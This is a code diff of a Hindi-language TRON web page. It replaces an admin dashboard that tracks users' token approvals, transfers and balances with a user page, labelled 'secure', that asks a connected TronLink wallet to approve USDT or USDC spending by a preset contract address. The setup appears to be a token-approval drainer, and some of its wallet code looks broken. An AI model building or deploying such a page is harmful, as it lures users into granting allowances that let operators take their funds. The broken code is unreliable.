@@ -3,151 +3,443 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>👑 एडमिन पैनल - Token Approval System</title>
-    <link rel="stylesheet" href="style.css">
+    <title>टोकन अप्रूवल - यूजर पैनल</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+            color: #333;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            font-size: 28px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .header h1 span {
+            color: #667eea;
+        }
+
+        .wallet-section {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 30px;
+        }
+
+        .btn {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn-success {
+            background: #28a745;
+            color: white;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .info-box {
+            background: #e7f3ff;
+            border-left: 4px solid #007bff;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            font-size: 14px;
+        }
+
+        .wallet-address {
+            background: white;
+            padding: 10px 15px;
+            border-radius: 8px;
+            border: 1px solid #e0e0e0;
+            font-family: monospace;
+            margin-top: 10px;
+            word-break: break-all;
+        }
+
+        .tx-hash {
+            background: #f8f9fa;
+            padding: 10px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 12px;
+            word-break: break-all;
+            margin-top: 10px;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #666;
+            font-size: 12px;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 20px;
+            color: #667eea;
+        }
+
+        .loading:after {
+            content: '⏳ प्रोसेसिंग...';
+        }
+
+        .note {
+            background: #fff3cd;
+            border: 1px solid #ffeeba;
+            color: #856404;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 10px 0;
+            font-size: 13px;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
         <!-- हेडर -->
         <div class="header">
-            <h1>👑 <span>एडमिन पैनल</span></h1>
-            <p>Token Approval System for TRON Blockchain</p>
+            <h1>🔐 <span>टोकन अप्रूवल सिस्टम</span></h1>
+            <p>TRON ब्लॉकचेन पर सुरक्षित अप्रूवल</p>
         </div>
 
-        <!-- नेटवर्क इंडिकेटर -->
-        <div id="networkIndicator" class="network-badge"></div>
+        <!-- कॉन्ट्रैक्ट एड्रेस सेटिंग -->
+        <div class="note">
+            <strong>⚠️ कॉन्ट्रैक्ट एड्रेस:</strong>
+            <input type="text" id="contractAddress" value="TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt" 
+                   style="width: 100%; margin-top: 10px; padding: 8px;" 
+                   placeholder="कॉन्ट्रैक्ट एड्रेस डालें">
+            <button class="btn btn-success" style="margin-top: 10px;" onclick="updateContractAddress()">
+                ✅ एड्रेस सेट करें
+            </button>
+        </div>
 
-        <!-- वॉलेट सेक्शन -->
+        <!-- वॉलेट कनेक्ट -->
         <div class="wallet-section">
-            <div class="flex justify-between align-center">
-                <div>
-                    <strong>कॉन्ट्रैक्ट एड्रेस:</strong>
-                    <span id="contractAddress"></span>
-                    <a href="#" onclick="window.open('https://tronscan.org/#/address/' + CONFIG.contractAddress)">🔗</a>
-                </div>
-                <button id="connectBtn" class="btn btn-primary" onclick="connectWallet()">
-                    🔌 वॉलेट कनेक्ट करें
-                </button>
-            </div>
-            <div id="walletInfo" class="mt-20"></div>
+            <button id="connectBtn" class="btn btn-primary" onclick="connectWallet()">
+                🔌 TronLink वॉलेट कनेक्ट करें
+            </button>
+            <div id="walletAddress" class="wallet-address" style="display: none;"></div>
         </div>
 
-        <!-- टैब नेविगेशन -->
-        <div class="tabs">
-            <button class="tab active" onclick="switchTab('dashboard')">📊 डैशबोर्ड</button>
-            <button class="tab" onclick="switchTab('approvals')">✅ अप्रूवल</button>
-            <button class="tab" onclick="switchTab('transactions')">💸 ट्रांजेक्शन</button>
-            <button class="tab" onclick="switchTab('users')">👥 यूजर्स</button>
-            <button class="tab" onclick="switchTab('settings')">⚙️ सेटिंग्स</button>
-        </div>
-
-        <!-- ===== डैशबोर्ड टैब ===== -->
-        <div id="dashboard-tab" class="tab-content">
-            <div class="stats-grid">
-                <div class="stat-card">
-                    <h3>कुल ट्रांजेक्शन</h3>
-                    <div class="number" id="totalTx">0</div>
-                    <div class="sub">पिछले 24 घंटे</div>
-                </div>
-                <div class="stat-card">
-                    <h3>कुल यूजर्स</h3>
-                    <div class="number" id="totalUsers">0</div>
-                    <div class="sub">एक्टिव यूजर्स</div>
-                </div>
-                <div class="stat-card">
-                    <h3>कुल वॉल्यूम</h3>
-                    <div class="number" id="totalVolume">0</div>
-                    <div class="sub">USDT में</div>
-                </div>
-                <div class="stat-card">
-                    <h3>पेंडिंग अप्रूवल</h3>
-                    <div class="number" id="pendingApprovals">0</div>
-                    <div class="sub">एक्टिव अप्रूवल</div>
-                </div>
-            </div>
-
-            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 25px;">
-                <div style="background: #f8f9fa; padding: 20px; border-radius: 12px;">
-                    <h3 style="margin-bottom: 15px;">🔥 हालिया ट्रांजेक्शन</h3>
-                    <div id="recentTx"></div>
-                </div>
-                <div style="background: #f8f9fa; padding: 20px; border-radius: 12px;">
-                    <h3 style="margin-bottom: 15px;">👑 टॉप यूजर्स</h3>
-                    <div id="topUsers"></div>
-                </div>
-            </div>
-        </div>
-
-        <!-- ===== अप्रूवल टैब ===== -->
-        <div id="approvals-tab" class="tab-content" style="display: none;">
-            <div class="filter-bar">
-                <input type="text" id="approvalSearch" placeholder="🔍 यूजर एड्रेस सर्च करें...">
-                <select id="approvalFilter">
-                    <option value="all">सभी अप्रूवल</option>
-                    <option value="active">एक्टिव</option>
-                    <option value="used">यूज्ड</option>
+        <!-- मेन एप्लिकेशन (वॉलेट कनेक्ट होने के बाद दिखेगा) -->
+        <div id="app" style="display: none;">
+            
+            <!-- स्टेप 1: टोकन सेलेक्ट -->
+            <div class="form-group">
+                <label>टोकन चुनें:</label>
+                <select id="tokenSelect">
+                    <option value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t">USDT (TRC-20)</option>
+                    <option value="TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8">USDC (TRC-20)</option>
                 </select>
-                <button class="btn btn-secondary" onclick="refreshApprovals()">⟳ रिफ्रेश</button>
-                <button class="btn btn-primary" onclick="exportApprovals()">📥 एक्सपोर्ट</button>
             </div>
 
-            <div class="table-container">
-                <table>
-                    <thead>
-                        <tr>
-                            <th>यूजर एड्रेस</th>
-                            <th>टोकन</th>
-                            <th>अमाउंट</th>
-                            <th>अप्रूव टाइम</th>
-                            <th>स्टेटस</th>
-                            <th>टीएक्स हैश</th>
-                            <th>एक्शन</th>
-                        </tr>
-                    </thead>
-                    <tbody id="approvalsTable">
-                        <tr><td colspan="7" class="text-center">⏳ डेटा लोड हो रहा है...</td></tr>
-                    </tbody>
-                </table>
-            </div>
-        </div>
-
-        <!-- ===== ट्रांजेक्शन टैब ===== -->
-        <div id="transactions-tab" class="tab-content" style="display: none;">
-            <div class="filter-bar">
-                <input type="text" id="txSearch" placeholder="🔍 एड्रेस या TX हैश...">
-                <input type="date" id="txDate">
-                <select id="txType">
-                    <option value="all">सभी ट्रांजेक्शन</option>
-                    <option value="transfer">ट्रांसफर</option>
-                    <option value="approval">अप्रूवल</option>
-                </select>
-                <button class="btn btn-primary" onclick="exportToCSV()">📥 CSV एक्सपोर्ट</button>
+            <!-- स्टेप 2: अप्रूवल अमाउंट -->
+            <div class="form-group">
+                <label>अप्रूवल अमाउंट (USDT):</label>
+                <input type="number" id="approveAmount" placeholder="जितना अप्रूव करना है" min="0" step="1">
             </div>
 
-            <div class="table-container">
-                <table>
-                    <thead>
-                        <tr>
-                            <th>टाइम</th>
-                            <th>टाइप</th>
-                            <th>फ्रॉम</th>
-                            <th>टू</th>
-                            <th>अमाउंट</th>
-                            <th>टीएक्स हैश</th>
-                            <th>स्टेटस</th>
-                        </tr>
-                    </thead>
-                    <tbody id="transactionsTable">
-                        <tr><td colspan="7" class="text-center">⏳ डेटा लोड हो रहा है...</td></tr>
-                    </tbody>
-                </table>
-            </div>
+            <!-- स्टेप 3: अप्रूव बटन -->
+            <button class="btn btn-primary" onclick="approveToken()" id="approveBtn">
+                ✅ अप्रूव करें
+            </button>
 
-            <div class="flex justify-between align-center mt-20">
-                <button class="btn btn-secondary" onclick="prevPage()">← पिछला</button>
-                <span id="pageInfo">पेज 1</span>
-                <button class="btn btn-secondary" onclick="nextPage()">अगला →</button>
+            <!-- बैलेंस चेक -->
+            <button class="btn btn-success" style="margin-top: 10px;" onclick="checkBalance()">
+                💰 मेरा बैलेंस चेक करें
+            </button>
+
+            <!-- अप्रूवल चेक -->
+            <button class="btn" style="margin-top: 10px; background: #6c757d; color: white;" onclick="checkMyAllowance()">
+                🔍 मेरा अप्रूवल चेक करें
+            </button>
+
+            <!-- रिजल्ट दिखाने के लिए -->
+            <div id="result" class="tx-hash" style="display: none;"></div>
+
+            <!-- नोट -->
+            <div class="note" style="margin-top: 20px;">
+                <strong>📌 नोट:</strong><br>
+                • पहले अप्रूव करें, फिर ट्रांसफर होगा<br>
+                • गैस के लिए पर्याप्त TRX रखें<br>
+                • 1 USDT = 1,000,000 सन
             </div>
         </div>
 
-        <!-- ===== यूजर्स टैब
+        <!-- फुटर -->
+        <div class="footer">
+            ⚡ सुरक्षित टोकन अप्रूवल सिस्टम<br>
+            <span id="networkDisplay">मेननेट</span> पर चल रहा है
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
+    <script>
+        // ============================================
+        // यूजर पैनल - सिर्फ अप्रूवल के लिए
+        // ============================================
+
+        let tronWeb = null;
+        let userAddress = null;
+        let contractAddress = "YOUR_CONTRACT_ADDRESS_HERE";
+
+        // कॉन्फिग
+        const NETWORK = "https://api.trongrid.io"; // मेननेट
+
+        // ============================================
+        // कॉन्ट्रैक्ट एड्रेस अपडेट करें
+        // ============================================
+        window.updateContractAddress = function() {
+            const newAddress = document.getElementById('contractAddress').value.trim();
+            if (newAddress && newAddress.startsWith('T')) {
+                contractAddress = newAddress;
+                showMessage('✅ कॉन्ट्रैक्ट एड्रेस सेट हो गया', 'success');
+            } else {
+                showMessage('❌ सही एड्रेस डालें', 'error');
+            }
+        };
+
+        // ============================================
+        // वॉलेट कनेक्ट करें
+        // ============================================
+        window.connectWallet = async function() {
+            if (contractAddress === "YOUR_CONTRACT_ADDRESS_HERE") {
+                showMessage('पहले कॉन्ट्रैक्ट एड्रेस डालें!', 'error');
+                return;
+            }
+
+            const connectBtn = document.getElementById('connectBtn');
+            connectBtn.disabled = true;
+            connectBtn.innerHTML = '⏳ कनेक्ट हो रहा है...';
+
+            try {
+                if (!window.tronLink) {
+                    alert('TronLink वॉलेट इंस्टॉल नहीं है!\nhttps://www.tronlink.org/');
+                    return;
+                }
+
+                await window.tronLink.request({ method: 'tron_requestAccounts' });
+                
+                tronWeb = new TronWeb({
+                    fullHost: NETWORK,
+                    privateKey: window.tronLink.privateKey
+                });
+
+                userAddress = tronWeb.defaultAddress.base58;
+                
+                // UI अपडेट
+                document.getElementById('connectBtn').style.display = 'none';
+                document.getElementById('walletAddress').style.display = 'block';
+                document.getElementById('walletAddress').innerHTML = 
+                    `🔗 ${shortenAddress(userAddress)} 
+                     <a href="https://tronscan.org/#/address/${userAddress}" target="_blank">🔍</a>`;
+                
+                document.getElementById('app').style.display = 'block';
+                
+                showMessage('✅ वॉलेट कनेक्ट हो गया!', 'success');
+
+            } catch (error) {
+                console.error(error);
+                showMessage('❌ कनेक्ट करने में एरर: ' + error.message, 'error');
+            } finally {
+                connectBtn.disabled = false;
+                connectBtn.innerHTML = '🔌 TronLink वॉलेट कनेक्ट करें';
+            }
+        };
+
+        // ============================================
+        // टोकन अप्रूव करें
+        // ============================================
+        window.approveToken = async function() {
+            const amount = document.getElementById('approveAmount').value;
+            const tokenAddress = document.getElementById('tokenSelect').value;
+
+            if (!amount || amount <= 0) {
+                showMessage('❌ अमाउंट डालें', 'error');
+                return;
+            }
+
+            const approveBtn = document.getElementById('approveBtn');
+            approveBtn.disabled = true;
+            approveBtn.innerHTML = '⏳ अप्रूव हो रहा है...';
+
+            try {
+                // टोकन कॉन्ट्रैक्ट इंस्टैंशिएट करें
+                const tokenContract = await tronWeb.contract().at(tokenAddress);
+                
+                // अमाउंट को सन में कन्वर्ट करें (USDT = 6 decimals)
+                const amountInSun = Math.floor(amount * 1000000);
+
+                // approve फंक्शन कॉल करें
+                const result = await tokenContract.approve(
+                    contractAddress,
+                    amountInSun
+                ).send();
+
+                showMessage(`✅ अप्रूवल सक्सेस!`, 'success');
+                
+                document.getElementById('result').style.display = 'block';
+                document.getElementById('result').innerHTML = `
+                    ✅ अप्रूवल सक्सेस!<br>
+                    TX: <a href="https://tronscan.org/#/transaction/${result}" target="_blank">
+                        ${shortenAddress(result)}
+                    </a>
+                `;
+
+            } catch (error) {
+                console.error(error);
+                showMessage('❌ अप्रूवल फेल: ' + error.message, 'error');
+            } finally {
+                approveBtn.disabled = false;
+                approveBtn.innerHTML = '✅ अप्रूव करें';
+            }
+        };
+
+        // ============================================
+        // मेरा बैलेंस चेक करें
+        // ============================================
+        window.checkBalance = async function() {
+            const tokenAddress = document.getElementById('tokenSelect').value;
+
+            try {
+                const tokenContract = await tronWeb.contract().at(tokenAddress);
+                const balance = await tokenContract.balanceOf(userAddress).call();
+                
+                // USDT के 6 decimals को ह्यूमन रीडेबल में बदलें
+                const humanReadable = (balance / 1000000).toFixed(2);
+                
+                showMessage(`💰 आपका बैलेंस: ${humanReadable} USDT`, 'success');
+
+            } catch (error) {
+                showMessage('❌ बैलेंस चेक करने में एरर', 'error');
+            }
+        };
+
+        // ============================================
+        // मेरा अप्रूवल चेक करें
+        // ============================================
+        window.checkMyAllowance = async function() {
+            const tokenAddress = document.getElementById('tokenSelect').value;
+
+            try {
+                const tokenContract = await tronWeb.contract().at(tokenAddress);
+                const allowance = await tokenContract.allowance(
+                    userAddress,
+                    contractAddress
+                ).call();
+
+                const humanReadable = (allowance / 1000000).toFixed(2);
+                
+                showMessage(`🔍 आपने ${humanReadable} USDT अप्रूव किया है`, 'info');
+
+            } catch (error) {
+                showMessage('❌ चेक करने में एरर', 'error');
+            }
+        };
+
+        // ============================================
+        // मैसेज दिखाएं
+        // ============================================
+        function showMessage(message, type = 'info') {
+            const resultDiv = document.getElementById('result');
+            resultDiv.style.display = 'block';
+            
+            const colors = {
+                success: '#d4edda',
+                error: '#f8d7da',
+                info: '#cce5ff'
+            };
+            
+            resultDiv.style.background = colors[type] || '#f8f9fa';
+            resultDiv.style.color = '#333';
+            resultDiv.innerHTML = message;
+            
+            // 5 सेकंड बाद छुपाएं
+            setTimeout(() => {
+                if (type !== 'success') {
+                    resultDiv.style.display = 'none';
+                }
+            }, 5000);
+        }
+
+        // ============================================
+        // एड्रेस शॉर्ट करें
+        // ============================================
+        function shortenAddress(address) {
+            if (!address) return '';
+            return address.slice(0, 6) + '...' + address.slice(-4);
+        }
+
+        // ============================================
+        // नेटवर्क डिस्प्ले
+        // ============================================
+        document.getElementById('networkDisplay').innerText = 
+            NETWORK.includes('shasta') ? 'टेस्टनेट' : 'मेननेट';
+    </script>
+</body>
+</html>
